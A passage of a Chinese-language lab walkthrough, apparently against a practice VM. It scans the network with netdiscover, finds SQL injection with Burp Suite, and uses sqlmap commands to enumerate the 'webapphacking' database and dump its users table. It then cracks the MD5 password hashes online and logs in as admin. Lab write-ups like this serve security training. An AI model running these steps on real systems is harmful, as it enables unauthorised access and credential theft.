命令:netdiscover -r 192.168.72.0/16

# **0x02:BurpSuite漏扫+sqlmap获取信息**

这里我顺便开启Burp Suite的主动漏扫功能可以看到应该就是在搜索功能存在SQL注入。

![](../Images/e2c92920eff7a35e910ca7d196e49514.png)

  

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

把信息复制保存成文本丢到kali里面。

![](../Images/6e8a5b5782c3dffe417883cf987abe6f.png)

  

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

Sqlmap启动。由于之前已经做过一次了直接跑出来了。

命令:sqlmap -r 1.txt –batch

![](../Images/757adf96a10b1296ea21149f2846a9d5.png)

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

接着看看数据库名有一个webapphacking跟进去

命令:sqlmap -r 1.txt –batch --dbs

![](../Images/d7c0987fe9595dfab53b43c155570115.png)

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

看到居然有user表

命令:sqlmap -r 1.txt –batch –dbs -D webapphacking --tables

![](../Images/2209dfe065033c257a3e18fc1810428d.png)

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

那么果断直接跑里面的数据了。当然也跑出一些账号密码出来。有个admin关键字。

命令:sqlmap -r 1.txt –batch –dbs -D webapphacking –tables -T users --dump

![](../Images/a0b3a6766b0bb0cb36d4fd352cccf017.png)

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

这里找了一个在线MD5可以解密出来。

![](../Images/27ba7acfbe45ec2a6608bea31bf8181f.png)

![](../Images/383d6a43f31f3a88b9d2944ff7cb5c7c.png)

  

使用该账号密码登录成功!

![](../Images/40d50dbbb5c0cc05c24cffc630b948fe.png)
